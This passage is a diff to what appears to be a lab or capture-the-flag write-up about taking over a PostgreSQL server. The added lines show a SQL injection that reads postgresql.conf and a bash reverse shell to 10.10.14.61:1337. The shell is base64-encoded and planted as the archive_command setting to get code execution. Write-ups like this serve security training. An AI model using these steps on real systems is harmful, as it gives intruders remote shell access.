@@ -271,5 +271,18 @@ So ill follow this article to try and get RCE
 ''; SELECT pg_read_file('/etc/postgresql/15/main/postgresql.conf');
 ```
 
-Rather getting the LOID of the file then using that to output it, ill just use this copy the contents to my machine and modify the command paramter
+Rather getting the LOID of the file then using that to output it, ill just use this copy the contents to my machine and modify the command parameter
+
+```python
+echo 'bash -i &>/dev/tcp/10.10.14.61/1337 <&1' | base64
+YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjYxLzEzMzcgPCYxCg==
+```
+
+Ill encode my command
+
+```python
+archive_command = 'echo "YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjYxLzEzMzcgPCYxCg==" | base64 -d | bash'
+```
+
+Then ill append it to the file
 
